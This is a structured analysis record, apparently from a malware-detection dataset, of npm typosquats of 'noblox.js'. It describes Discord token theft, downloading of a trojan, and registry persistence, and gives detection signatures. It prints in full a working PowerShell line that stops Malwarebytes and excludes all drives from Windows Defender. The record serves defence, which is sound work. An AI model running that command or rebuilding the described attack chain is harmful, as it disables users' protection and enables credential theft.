package_info.package_versions: latest versions as of August 2024 (all versions published by attacker)
package_info.why_malicious: These packages are malicious typosquats of the legitimate 'noblox.js' library, created to deceive users via brandjacking, combosquatting, and starjacking. They contain heavily obfuscated postinstall scripts that execute malware designed to steal sensitive data (such as Discord tokens), disable antivirus protections, download and execute remote access trojans, and establish persistence on infected systems. The packages are not maintained by the legitimate noblox.js authors and serve no legitimate purpose.

malicious_snippets.code_snippet: (function(_0x41d81,_0x100026){function ... // heavily obfuscated code with Chinese characters
malicious_snippets.code_behavior: During postinstall, the obfuscated JavaScript code executes, decoding and running additional malicious logic, initiating the malware chain by downloading further payloads, disabling security software, stealing tokens, and establishing persistence.

malice_analysis.why_suspicious: Obfuscated code in a postinstall script is highly suspicious, especially when it is not required for legitimate package setup and contains unreadable variable names and non-ASCII characters.
malice_analysis.violated_expectations: Legitimate npm packages do not use obfuscation in postinstall scripts, nor do they perform system-level operations or download and execute additional code.
malice_analysis.similar_legitimate_use: Obfuscation may be used to protect proprietary logic, but never in postinstall scripts that execute on user systems.
key_indicators: Heavily obfuscated JavaScript with non-ASCII characters
Decoding and execution of additional payloads

malicious_snippets.code_behavior: At postinstall/runtime, the code searches local storage directories for Discord authentication tokens, validates the tokens, and exfiltrates valid tokens to a hardcoded Discord webhook controlled by the attacker, resulting in credential theft.

malice_analysis.why_suspicious: Harvesting and exfiltrating authentication tokens from local storage is a classic credential theft technique, especially when sent to an external webhook.
malice_analysis.violated_expectations: Legitimate npm packages do not access or exfiltrate Discord tokens or other user credentials.
malice_analysis.similar_legitimate_use: There is no legitimate reason for an npm package to access or transmit Discord tokens.
key_indicators: Access to Discord/Lightcord/Canary local storage directories
Extraction and validation of Discord tokens
Network requests to hardcoded Discord webhook for exfiltration

malicious_snippets.code_snippet: if (Get-Service MBAMService -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq 'Running'}) { Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe" -ArgumentList "--stopservice" }; (wmic logicaldisk get name).Trim() -split '\n' | Where-Object { $_ -match '^[A-Z]:$' } | ForEach-Object { Add-MpPreference -ExclusionPath $_.Trim() }
malicious_snippets.code_behavior: At postinstall/runtime, the code checks if the Malwarebytes service is running and attempts to stop it, then enumerates all logical drives and adds them to Windows Defender's exclusion list, effectively disabling antivirus protection.

malice_analysis.why_suspicious: Disabling security software and adding system-wide antivirus exclusions are hallmark behaviors of malware seeking to evade detection and removal.
malice_analysis.violated_expectations: Legitimate npm packages do not interact with or disable antivirus software, nor do they modify system-wide security settings.
malice_analysis.similar_legitimate_use: Rarely, enterprise deployment scripts may adjust AV settings, but this is never appropriate in npm packages distributed to the public.
key_indicators: PowerShell commands to stop Malwarebytes service
Adding all drives to Windows Defender exclusion list

malicious_snippets.code_behavior: At postinstall/runtime, the code decodes base64-encoded URLs, downloads two executables ('cmd.exe' and 'Client-built.exe') from the attacker's GitHub repository, saves them with randomized names in C:\WindowsApi, and executes them, resulting in remote access trojan deployment.

malice_analysis.why_suspicious: Downloading and executing binaries from an external source, especially with randomized file names and from a suspicious GitHub repository, is a classic malware delivery technique.
malice_analysis.violated_expectations: Legitimate npm packages do not download or execute arbitrary binaries from external sources.
malice_analysis.similar_legitimate_use: Only highly controlled enterprise deployment scripts might download binaries, never public npm packages.
key_indicators: Download and execution of binaries from GitHub

malicious_snippets.code_behavior: At postinstall/runtime, the code modifies the Windows registry by adding and setting the ms-settings Shell Open command key to execute the malware, establishing persistence so that the malware runs whenever the Windows Settings app is opened.

malice_analysis.why_suspicious: Registry hijacking for persistence is a well-known malware tactic, especially when targeting ms-settings to ensure code execution on user action.
malice_analysis.violated_expectations: Legitimate npm packages do not alter registry keys to establish persistence or hijack system commands.
malice_analysis.similar_legitimate_use: There is no legitimate use for npm packages to modify ms-settings registry keys.
key_indicators: Use of shell commands to alter registry

attack_chain.action: User installs a malicious npm package, triggering the postinstall script.
Obfuscated postinstall script executes, decoding and running additional malicious logic.
attack_chain.leads_to: Token theft, antivirus evasion, payload download, and persistence setup

attack_chain.action: Malware searches for and exfiltrates Discord authentication tokens to the attacker's Discord webhook.
Malware disables Malwarebytes and adds all drives to Windows Defender's exclusion list.
Malware downloads and executes additional payloads (cmd.exe, Client-built.exe) from the attacker's GitHub repository.
Malware establishes persistence by hijacking the Windows Settings registry key.
QuasarRAT is deployed via the downloaded payload, granting the attacker remote control over the system.

behavioral_signatures: Access to Discord/Lightcord/Canary local storage directories for token extraction
Network requests to hardcoded Discord webhooks for credential exfiltration
Downloading and executing binaries from GitHub repositories using base64-encoded URLs
Modification of Windows registry keys for ms-settings persistence
Disabling antivirus services (Malwarebytes) and adding all drives to Windows Defender exclusion list
file_indicators: postinstall.js containing obfuscated or unreadable code
References to Client-built.exe and cmd.exe in downloaded files
detection_knowledge.how_to_detect: Monitor for npm packages with obfuscated postinstall scripts, especially those mimicking popular libraries. Flag any package that accesses Discord token storage, disables antivirus services, or downloads executables from external sources such as GitHub. Watch for registry modifications to the ms-settings Shell Open command and for network connections to known Discord webhooks or suspicious GitHub repositories. Automated detection should correlate these behaviors to identify malicious packages.
